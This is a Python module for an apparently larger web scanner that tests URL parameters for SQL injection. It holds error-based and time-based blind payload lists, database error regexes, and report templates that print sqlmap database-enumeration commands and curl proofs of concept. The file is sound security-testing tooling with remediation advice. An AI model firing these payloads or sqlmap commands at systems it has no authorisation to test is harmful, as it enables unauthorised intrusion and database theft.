from typing import Optional
"""
SQL Injection Scanner
- Error-based detection
- Time-based blind (SLEEP/WAITFOR)
- Boolean-based hints
"""

import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console
from core.models import Vulnerability, Severity

console = Console()

ERROR_PATTERNS = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    # PostgreSQL
    r"pg_query\(\):",
    r"postgresql.*error",
    r"unterminated quoted string at or near",
    # MSSQL
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"incorrect syntax near",
    # Oracle
    r"ora-\d{5}",
    r"oracle error",
    r"oracle.*driver",
    # SQLite
    r"sqlite_error",
    r"sqlite3\.operationalerror",
    # Generic
    r"sql syntax.*mysql",
    r"syntax error.*sql",
    r"mysql_fetch",
    r"num_rows",
]

ERROR_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1--",
    "' OR 1=1#",
    "1' AND 1=CONVERT(int,@@version)--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
]

TIME_PAYLOADS = [
    ("' AND SLEEP(3)--",        3, "MySQL"),
    ("'; WAITFOR DELAY '0:0:3'--", 3, "MSSQL"),
    ("' AND pg_sleep(3)--",     3, "PostgreSQL"),
    ("' OR SLEEP(3)--",         3, "MySQL"),
    ("1; SELECT pg_sleep(3)--", 3, "PostgreSQL"),
]


class SQLiScanner:
    def __init__(self, http_client):
        self.http_client = http_client

    def _extract_params(self, url: str) -> list[str]:
        parsed = urlparse(url)
        return list(parse_qs(parsed.query, keep_blank_values=True).keys())

    def _inject(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    def _has_sql_error(self, text: str) -> Optional[str ]:
        for pattern in ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                return pattern
        return None

    async def _test_error_based(self, url: str, param: str) -> Optional[Vulnerability ]:
        for payload in ERROR_PAYLOADS:
            test_url = self._inject(url, param, payload)
            response = await self.http_client.get(test_url)
            if not response:
                continue

            matched = self._has_sql_error(response.text)
            if matched:
                return Vulnerability(
                    vuln_type="SQL Injection",
                    url=test_url,
                    severity=Severity.CRITICAL,
                    cvss_score=9.8,
                    title=f"SQL Injection (Error-Based) — {param}",
                    description=(
                        f"The '{param}' parameter is vulnerable to SQL injection. "
                        f"The server returned a SQL error message."
                    ),
                    evidence=f"SQL error pattern found: '{matched}'",
                    exploitation=(
                        f"Automated exploit with SQLMap:\n"
                        f"sqlmap -u \"{url}\" -p {param} --dbs --batch\n\n"
                        f"Manual test:\n"
                        f"curl \"{test_url}\""
                    ),
                    remediation=(
                        "1. Use prepared statements / parameterized queries\n"
                        "2. Use an ORM\n"
                        "3. Apply input validation\n"
                        "4. Hide SQL error messages in production"
                    ),
                    parameter=param,
                    payload_used=payload,
                    curl_poc=f'curl -s "{test_url}" | grep -i "error"',
                    cwe_id="CWE-89",
                    references=[
                        "https://owasp.org/www-community/attacks/SQL_Injection",
                        "https://portswigger.net/web-security/sql-injection",
                    ],
                )
        return None

    async def _test_time_based(self, url: str, param: str) -> Optional[Vulnerability ]:
        # Baseline response time
        baseline_times = []
        for _ in range(2):
            t0 = time.monotonic()
            r = await self.http_client.get(url)
            if r:
                baseline_times.append(time.monotonic() - t0)
        baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 1.0

        for payload, expected_delay, db_type in TIME_PAYLOADS:
            test_url = self._inject(url, param, payload)
            t0 = time.monotonic()
            await self.http_client.get(test_url)
            elapsed = time.monotonic() - t0

            if elapsed >= (expected_delay * 0.8) and elapsed > baseline + 2:
                return Vulnerability(
                    vuln_type="SQL Injection",
                    url=test_url,
                    severity=Severity.CRITICAL,
                    cvss_score=9.0,
                    title=f"SQL Injection (Time-Based Blind) — {param} [{db_type}]",
                    description=(
                        f"The '{param}' parameter is vulnerable to time-based blind SQL injection. "
                        f"Likely database: {db_type}. "
                        f"The response was delayed by {elapsed:.1f}s (baseline: {baseline:.1f}s)."
                    ),
                    evidence=(
                        f"Payload: {payload}\n"
                        f"Response time: {elapsed:.2f}s (expected: {expected_delay}s)\n"
                        f"Baseline: {baseline:.2f}s"
                    ),
                    exploitation=(
                        f"SQLMap time-based:\n"
                        f"sqlmap -u \"{url}\" -p {param} --technique=T --dbs --batch\n\n"
                        f"Manual data extraction:\n"
                        f"' AND IF(1=1,SLEEP(3),0)--  → true condition\n"
                        f"' AND IF(1=2,SLEEP(3),0)--  → false condition"
                    ),
                    remediation=(
                        "1. Parameterized queries / prepared statements\n"
                        "2. Stored procedures\n"
                        "3. Least privilege DB user\n"
                        "4. Apply a WAF"
                    ),
                    parameter=param,
                    payload_used=payload,
                    curl_poc=f'curl -s -w "\\nTime: %{{time_total}}s" "{test_url}"',
                    cwe_id="CWE-89",
                )
        return None

    async def scan(self, url: str) -> list[Vulnerability]:
        params = self._extract_params(url)
        if not params:
            return []

        console.print(f"  [dim]SQLi scan: {len(params)} parameters — {url[:60]}[/dim]")
        vulns = []

        for param in params:
            # Error-based first — fast
            vuln = await self._test_error_based(url, param)
            if vuln:
                vulns.append(vuln)
                console.print(f"  {vuln.severity.emoji} [bold red]SQLi (error-based):[/bold red] {param}")
                continue  # No need for time-based if error-based was found

            # Time-based blind
            vuln = await self._test_time_based(url, param)
            if vuln:
                vulns.append(vuln)
                console.print(f"  {vuln.severity.emoji} [bold red]SQLi (time-based):[/bold red] {param}")

        return vulns